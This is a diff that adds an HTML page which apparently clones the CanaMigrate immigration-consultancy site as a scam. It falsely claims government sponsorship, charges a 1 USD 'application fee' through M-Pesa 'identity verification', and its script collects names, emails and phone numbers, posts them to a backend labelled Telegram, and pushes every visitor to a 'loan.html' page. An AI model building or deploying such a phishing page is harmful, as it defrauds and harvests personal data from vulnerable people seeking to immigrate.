@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free Sponsored CanaMigrate.com — Canadian Immigration Assessment</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #1a1a2e;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        ul {
+            list-style: none;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        /* ===== HEADER / NAV ===== */
+        
+        header {
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .logo img {
+            height: 36px;
+        }
+        
+        .lang-toggle {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+            cursor: pointer;
+            padding: 6px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: #fff;
+            transition: all 0.2s;
+        }
+        
+        .lang-toggle:hover {
+            border-color: #b31b1b;
+            color: #b31b1b;
+        }
+        
+        .lang-toggle svg {
+            width: 16px;
+            height: 16px;
+        }
+        /* ===== HERO SECTION ===== */
+        
+        .hero {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-bg {
+            position: absolute;
+            inset: 0;
+            z-index: 0;
+        }
+        
+        .hero-bg img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .hero-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(179, 27, 27, 0.85) 0%, rgba(120, 20, 20, 0.9) 100%);
+            z-index: 1;
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            padding: 80px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            min-height: 600px;
+        }
+        
+        .hero-left {
+            flex: 1;
+            color: #fff;
+        }
+        
+        .hero-left h1 {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+        
+        .hero-left h1 span {
+            display: block;
+        }
+        
+        .hero-left p {
+            font-size: 18px;
+            line-height: 1.7;
+            margin-bottom: 24px;
+            opacity: 0.92;
+        }
+        
+        .hero-badges {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+        
+        .hero-badges img {
+            height: 48px;
+        }
+        
+        .hero-right {
+            flex: 1;
+            max-width: 480px;
+            background: #fff;
+            border-radius: 16px;
+            padding: 36px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+        }
+        
+        .hero-right h3 {
+            font-size: 22px;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+        
+        .hero-right .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        /* ===== FORM ===== */
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            background: #fafafa;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #b31b1b;
+            background: #fff;
+        }
+        
+        .phone-group {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .phone-group select {
+            width: 100px;
+            flex-shrink: 0;
+        }
+        
+        .phone-group input {
+            flex: 1;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #b31b1b;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .btn-primary:hover {
+            background: #8a1515;
+        }
+        
+        .form-footer {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 16px;
+        }
+        
+        .form-footer a {
+            color: #b31b1b;
+            text-decoration: underline;
+        }
+        /* ===== WHAT WE DO ===== */
+        
+        .section {
+            padding: 80px 20px;
+        }
+        
+        .section-alt {
+            background: #f9f6f6;
+        }
+        
+        .section-title {
+            font-size: 36px;
+            font-weight: 700;
+            color: #1a1a2e;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        
+        .section-subtitle {
+            font-size: 18px;
+            color: #666;
+            text-align: center;
+            max-width: 700px;
+            margin: 0 auto 50px;
+        }
+        
+        .what-we-do-grid {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .what-we-do-grid .text {
+            flex: 1;
+            font-size: 17px;
+            color: #444;
+            line-height: 1.8;
+        }
+        
+        .what-we-do-grid .image {
+            flex: 1;
+        }
+        
+        .what-we-do-grid .image img {
+            border-radius: 12px;
+        }
+        /* ===== WHY INTERVIEW ===== */
+        
+        .why-grid {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .why-grid .image {
+            flex: 1;
+        }
+        
+        .why-grid .image img {
+            border-radius: 12px;
+        }
+        
+        .why-grid .text {
+            flex: 1;
+        }
+        
+        .why-grid .text h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #1a1a2e;
+        }
+        
+        .why-grid .text ul {
+            margin-bottom: 24px;
+        }
+        
+        .why-grid .text ul li {
+            position: relative;
+            padding-left: 28px;
+            margin-bottom: 12px;
+            font-size: 16px;
+            color: #444;
+        }
+        
+        .why-grid .text ul li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #b31b1b;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        
+        .btn-secondary {
+            display: inline-block;
+            padding: 14px 36px;
+            background: #b31b1b;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .btn-secondary:hover {
+            background: #8a1515;
+        }
+        /* ===== HOW IT WORKS ===== */
+        
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+            margin-top: 40px;
+        }
+        
+        .step-card {
+            background: #fff;
+            border-radius: 14px;
+            padding: 28px 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+            border: 1px solid #f0f0f0;
+            transition: transform 0.2s;
+        }
+        
+        .step-card:hover {
+            transform: translateY(-4px);
+        }
+        
+        .step-number {
+            font-size: 32px;
+            font-weight: 800;
+            color: #b31b1b;
+            background: #fef0f0;
+            width: 56px;
+            height: 56px;
+            line-height: 56px;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+        }
+        
+        .step-card p {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.6;
+        }
+        /* ===== RCIC SECTION ===== */
+        
+        .rcic-grid {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .rcic-grid .image {
+            flex: 1;
+        }
+        
+        .rcic-grid .image img {
+            border-radius: 12px;
+        }
+        
+        .rcic-grid .text {
+            flex: 1;
+        }
+        
+        .rcic-grid .text h2 {
+            font-size: 36px;
+            margin-bottom: 16px;
+            color: #1a1a2e;
+        }
+        
+        .rcic-grid .text>p {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.7;
+        }
+        
+        .rcic-grid .btn-verify {
+            display: inline-block;
+            padding: 12px 28px;
+            background: transparent;
+            color: #b31b1b;
+            border: 2px solid #b31b1b;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 24px;
+        }
+        
+        .rcic-grid .btn-verify:hover {
+            background: #b31b1b;
+            color: #fff;
+        }
+        
+        .rcic-benefits {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        .benefit-item {
+            font-size: 14px;
+            color: #444;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .benefit-item strong {
+            display: block;
+            color: #1a1a2e;
+            margin-bottom: 2px;
+        }
+        
+        .benefit-item::before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: #b31b1b;
+            font-weight: 700;
+        }
+        /* ===== CONTACT ===== */
+        
+        .contact-grid {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .contact-grid .info {
+            flex: 1;
+        }
+        
+        .contact-grid .info h2 {
+            font-size: 36px;
+            margin-bottom: 24px;
+            color: #1a1a2e;
+        }
+        
+        .contact-detail {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            color: #555;
+        }
+        
+        .contact-detail .icon {
+            width: 24px;
+            flex-shrink: 0;
+            color: #b31b1b;
+            font-size: 20px;
+        }
+        
+        .contact-grid .image {
+            flex: 1;
+        }
+        
+        .contact-grid .image img {
+            border-radius: 12px;
+        }
+        /* ===== FOOTER ===== */
+        
+        footer {
+            background: #1a1a2e;
+            color: #ccc;
+            padding: 50px 20px 30px;
+        }
+        
+        .footer-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-logo img {
+            height: 32px;
+        }
+        
+        .footer-social {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .footer-social a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.08);
+            transition: background 0.2s;
+        }
+        
+        .footer-social a:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .footer-social img {
+            width: 18px;
+            height: 18px;
+            filter: brightness(0) invert(1);
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.7;
+            color: #999;
+            margin-bottom: 20px;
+            max-width: 900px;
+        }
+        
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            font-size: 13px;
+            color: #888;
+        }
+        
+        .footer-bottom a {
+            color: #bbb;
+            text-decoration: underline;
+        }
+        
+        .footer-bottom a:hover {
+            color: #fff;
+        }
+        /* ===== RESPONSIVE ===== */
+        
+        @media (max-width: 1024px) {
+            .hero-content {
+                flex-direction: column;
+                padding: 50px 20px;
+                min-height: auto;
+            }
+            .hero-right {
+                max-width: 100%;
+            }
+            .what-we-do-grid {
+                flex-direction: column;
+            }
+            .why-grid {
+                flex-direction: column-reverse;
+            }
+            .rcic-grid {
+                flex-direction: column;
+            }
+            .contact-grid {
+                flex-direction: column;
+            }
+            .steps-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .rcic-benefits {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            .hero-left h1 {
+                font-size: 32px;
+            }
+            .section-title {
+                font-size: 28px;
+            }
+            .steps-grid {
+                grid-template-columns: 1fr;
+            }
+            .footer-top {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ===== HEADER ===== -->
+    <header>
+        <div class="header-inner">
+            <a href="/" class="logo">
+                <img src="https://flagcdn.com/32x24/ca.png" alt="Canada Flag" style="display:inline;vertical-align:middle;margin-right:10px;" /> </a>
+            <div class="lang-toggle">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/>
+          <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+        </svg> English
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== HERO ===== -->
+    <section class="hero">
+        <div class="hero-bg">
+            <img src="https://interview.canamigrate.com/img/home-redesign/hero.webp" alt="Canada Needs You" />
+        </div>
+        <div class="hero-overlay"></div>
+        <div class="hero-content">
+            <div class="hero-left">
+                <h1>
+                    Canada Needs You, Sponsored By Immigration Department
+                </h1>
+                <p>
+                    As of 2026, Canada aims to welcome 395,000 new permanent residents. This figure represents a reduction from previous targets, reflecting the government's efforts to balance immigration with housing, healthcare, and social services capacity.
+                </p>
+                <div class="hero-badges">
+                    <a href="https://www.canadavisareview.com/reviews/canamigrate-review-default">
+                        <img src="https://interview.canamigrate.com/static/img/cv-review.7a7f9e69.png" alt="Canadian Visa Review" />
+                    </a>
+                    <a href="https://college-ic.ca/protecting-the-public/find-an-immigration-consultant">
+                        <img src="https://interview.canamigrate.com/static/img/rcic_img.b14b14e4.png" alt="RCIC" />
+                    </a>
+                </div>
+            </div>
+            <div class="hero-right">
+                <h3>Discover Your Eligibility for Canadian Immigration With A 30 Minute Interview, Application fee is 1 USD</h3>
+                <p class="subtitle">To begin the immigration interview process, enter your information into our secure contact form below, and you will be directed to mpesa app to verify your identity.</p>
+
+                <form id="assessment-form">
+                    <div class="form-group">
+                        <label for="first-name">First Name</label>
+                        <input type="text" id="first-name" placeholder="Enter your first name" required />
+                    </div>
+                    <div class="form-group">
+                        <label for="last-name">Last Name</label>
+                        <input type="text" id="last-name" placeholder="Enter your last name" required />
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" placeholder="Enter your email address" required />
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <div class="phone-group">
+                            <select id="country-code">
+                <option value="7" selected>+254</option>
+                <option value="+93">+93 (Afghanistan)</option>
+                <option value="+355">+355 (Albania)</option>
+                <option value="+213">+213 (Algeria)</option>
+                <option value="+44">+44 (United Kingdom)</option>
+                <option value="+61">+61 (Australia)</option>
+                <option value="+49">+49 (Germany)</option>
+                <option value="+91">+91 (India)</option>
+                <option value="+234">+234 (Nigeria)</option>
+                <option value="+92">+92 (Pakistan)</option>
+                <option value="+63">+63 (Philippines)</option>
+                <option value="+27">+27 (South Africa)</option>
+                <option value="+971">+971 (UAE)</option>
+              </select>
+                            <input type="tel" id="phone" placeholder="Enter your phone number" required />
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-primary">Get started</button>
+                </form>
+
+                <p class="form-footer">
+                    CMG is a private Canadian Immigration company and is not affiliated with the Canadian Government. CMG offers paid professional immigration services. View the <a href="https://canamigrate.com/privacy-policy">privacy policy.</a>
+                </p>
+
+                <div class="hero-badges" style="margin-top: 16px; justify-content: center;">
+                    <a href="https://www.canadavisareview.com/reviews/canamigrate-review-default">
+                        <img src="https://interview.canamigrate.com/static/img/cv-review.7a7f9e69.png" alt="Canadian Visa Review" style="height:40px;" />
+                    </a>
+                    <a href="https://college-ic.ca/protecting-the-public/find-an-immigration-consultant">
+                        <img src="https://interview.canamigrate.com/static/img/rcic_img.b14b14e4.png" alt="RCIC" style="height:40px;" />
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== WHAT WE DO ===== -->
+    <section class="section">
+        <div class="what-we-do-grid">
+            <div class="text">
+                <h2 class="section-title" style="text-align:left;">What We Do</h2>
+                <p>
+                    Our dedicated team of RCICs and immigration professionals is available 24/7 to provide personalized services for individuals looking to live, work, or study in Canada. We offer expertise in assessing your unique situation, selecting the right immigration,
+                    and assisting you throughout the process.
+                </p>
+            </div>
+            <div class="image">
+                <img src="https://interview.canamigrate.com/static/img/what-we-do.0b6470ba.webp" alt="What We Do" />
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== WHY INTERVIEW ===== -->
+    <section class="section section-alt">
+        <div class="why-grid">
+            <div class="image">
+                <img src="https://interview.canamigrate.com/static/img/why-interview.ecb92b7f.webp" alt="Why Interview" />
+            </div>
+            <div class="text">
+                <h2>Why Do I Need an Interview?</h2>
+                <p style="color:#555; margin-bottom:20px;">Taking an interview is an essential step. It can help you in the following ways:</p>
+                <ul>
+                    <li>Determine the Best Immigration Program For You</li>
+                    <li>Determine Your Eligibility for Your Program</li>
+                    <li>Provide You With Ways to Improve Your Eligibility</li>
+                    <li>Help You Formulate A Canadian Immigration Strategy</li>
+                </ul>
+                <p style="color:#666; margin-bottom:24px;">Our 30-minute interview process will help you develop an immigration strategy that will maximize your chances of living your Canadian dream.</p>
+                <a href="#assessment-form" class="btn-secondary">Get started</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== HOW IT WORKS ===== -->
+    <section class="section">
+        <h2 class="section-title">Your Immigration Interview: How It Works</h2>
+        <div class="steps-grid">
+            <div class="step-card">
+                <div class="step-number">01</div>
+                <p>Fill in your information on our sign-up sheet.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">02</div>
+                <p>Get assigned an Immigration Account Manager who will call you to discuss your immigration plans.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">03</div>
+                <p>Take a 30-minute interview in which we discuss your work experience, education, age, and goals in Canada.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">04</div>
+                <p>Our immigration team assesses your profile and sets up your online immigration profile, along with a curated resume for your job search process.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== RCIC SECTION ===== -->
+    <section class="section section-alt">
+        <div class="rcic-grid">
+            <div class="image">
+                <img src="https://interview.canamigrate.com/static/img/rcic_img_1.3cf6850f.png" alt="RCIC" />
+            </div>
+            <div class="text">
+                <h2>Why Use a RCIC</h2>
+                <p>Choosing an RCIC can significantly enhance your chances of a successful immigration journey. Verify our RCIC credentials directly on the CICC website. Click the link to check for yourself:</p>
+                <a href="#assessment-form" class="btn-secondary">Get Verify a RCIC credentials</a>
+                <div class="rcic-benefits">
+                    <div class="benefit-item"><strong>Licensed Expertise</strong>RCICs are authorized by the College of Immigration and Citizenship Consultants (CICC) to offer legal advice and representation.</div>
+                    <div class="benefit-item"><strong>Up-to-Date Knowledge</strong>They stay informed about the latest immigration policies and processes, ensuring your application aligns with current regulations.</div>
+                    <div class="benefit-item"><strong>Error Reduction</strong>Avoid costly mistakes with professional guidance to prepare and submit accurate applications.</div>
+                    <div class="benefit-item"><strong>Personalized Support</strong>RCICs provide tailored advice based on your unique circumstances and immigration goals.</div>
+                    <div class="benefit-item"><strong>Representation</strong>They can represent you in communication with Canadian immigration authorities, simplifying the process and addressing any challenges on your behalf.</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== CONTACT ===== -->
+    <section class="section">
+        <div class="contact-grid">
+            <div class="info">
+                <h2>Contact Us</h2>
+                <div class="contact-detail">
+                    <div class="icon">📍</div>
+                    <div>
+                        <strong>Address</strong><br /> 666 Burrard Street, Suite 500, Vancouver, British Columbia V6C 3P6, Canada
+                    </div>
+                </div>
+                <div class="contact-detail">
+                    <div class="icon">📞</div>
+                    <div>
+                        <strong>Phone</strong>
+                    </div>
+                </div>
+                <div class="contact-detail">
+                    <div class="icon">✉️</div>
+                    <div>
+                        <strong>Email</strong>
+                    </div>
+                </div>
+            </div>
+            <div class="image">
+                <img src="https://interview.canamigrate.com/static/img/contact.97efda6a.webp" alt="Contact Us" />
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <img src="https://interview.canamigrate.com/static/img/white-logo.d24c8be8.png" alt="Canamigrate" />
+                </div>
+                <div class="footer-social">
+                    <a href="https://www.facebook.com/profile.php?id=61552946543668" aria-label="Facebook">
+                        <img src="https://canamigrate.com/assets/icons/social/facebook_outline.png" alt="facebook" />
+                    </a>
+                    <a href="https://twitter.com/CanaMigrate" aria-label="Twitter">
+                        <img src="https://canamigrate.com/assets/icons/social/twitter_outline.png" alt="twitter" />
+                    </a>
+                    <a href="https://www.youtube.com/@CanaMigrate" aria-label="YouTube">
+                        <img src="https://canamigrate.com/assets/icons/social/youtube_outline.png" alt="youtube" />
+                    </a>
+                    <a href="https://www.instagram.com/cana_migrate_/" aria-label="Instagram">
+                        <img src="https://canamigrate.com/assets/icons/social/instagram_outline.png" alt="instagram" />
+                    </a>
+                </div>
+            </div>
+
+            <div class="footer-disclaimer">
+                Canamigrate is a registered and fully compliant immigration consultancy, providing paid immigration services. The RCICs are registered with the CICC. The immigration interview is a preliminary step in the immigration process, and no immigration advice
+                is provided in this session. Please note: Our immigration consultants don't apply for electronic travel visas and authorizations (ETAs) on the user's behalf.
+            </div>
+
+            <div class="footer-bottom">
+                <span>Copyright 2026 © Canamigrate. All rights reserved.</span>
+                <span>This website is owned and operated by Immitech Online Ltd, 167-169 Great Portland Street, 5th Fl, London, England, W1W 5PF</span>
+                <span>
+          <a href="https://canamigrate.com/terms-of-use/">Terms of Use</a> |
+          <a href="https://canamigrate.com/privacy-policy/">Privacy Policy</a>
+        </span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ===== JAVASCRIPT ===== -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== Form Handling =====
+            const form = document.getElementById('assessment-form');
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const firstName = document.getElementById('first-name').value.trim();
+                const lastName = document.getElementById('last-name').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const countryCode = document.getElementById('country-code').value;
+                const phone = document.getElementById('phone').value.trim();
+
+                // Simple validation
+                if (!firstName || !lastName || !email || !phone) {
+                    alert('Please fill in all required fields.');
+                    return;
+                }
+
+                if (!email.includes('@') || !email.includes('.')) {
+                    alert('Please enter a valid email address.');
+                    return;
+                }
+
+                const submitBtn = form.querySelector('.btn-primary');
+                submitBtn.textContent = 'Processing...';
+                submitBtn.disabled = true;
+
+                // Save to localStorage for later pages
+                localStorage.setItem('firstName', firstName);
+                localStorage.setItem('lastName', lastName);
+                localStorage.setItem('email', email);
+                localStorage.setItem('phone', phone);
+
+                // Send lead to backend (Telegram)
+                fetch('/api/lead', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ firstName, lastName, email, countryCode, phone })
+                }).finally(function() {
+                    window.location.href = "loan.html";
+                });
+            });
+
+            // ===== Redirect for all "Get started" buttons =====
+            document.querySelectorAll('.btn-secondary, a[href="#assessment-form"]').forEach(function(link) {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    window.location.href = "loan.html";
+                });
+            });
+
+            // ===== Language Toggle =====
+            document.querySelector('.lang-toggle').addEventListener('click', function() {
+                alert('Language switching is not available in this demo.');
+            });
+
+            console.log('CanaMigrate Interview Page — Static Replica Loaded');
+        })();
+    </script>
+
+</body>
+
+</html>
